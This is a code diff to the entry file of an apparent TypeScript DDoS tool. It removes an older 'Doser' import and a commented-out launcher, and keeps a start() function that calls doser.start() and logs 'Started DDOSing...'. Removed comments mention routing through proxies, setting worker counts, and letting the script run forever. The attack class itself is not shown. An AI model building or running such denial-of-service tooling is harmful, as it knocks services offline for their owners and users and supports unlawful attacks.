@@ -1,4 +1,3 @@
-import {Doser} from "./doser";
 import {Doser2} from "./doser2";
 
 // Tutorial: https://khalilstemmler.com/blogs/typescript/node-starter-project/
@@ -14,24 +13,5 @@ function start() {
   console.log('Started DDOSing...')
   doser.start(); //Start DDOSing
 }
-
-// function start() {
-//   const doser = new Doser(true, 10)//32
-//   doser.listen('atack', (data) => console.log("Attack: ", data.log))
-//   doser.listen('error', (data) => console.log("Error: ", data.log))
-//
-//   // doser.forceProxy(true); // Use proxy to save the server
-//   // doser.setWorkersCount(32); // Count of workers
-//   console.log('Started DDOSing...')
-//   doser.start(); //Start DDOSing
-//
-//
-//   // Turn this script off after some time
-//   // If this is commented out then script will work forever
-//   // timeout = setTimeout(() => {
-//   //   doser.stop();
-//   //   console.log('Stopped DDOSing...')
-//   // }, 15000)
-// }
 
 start();
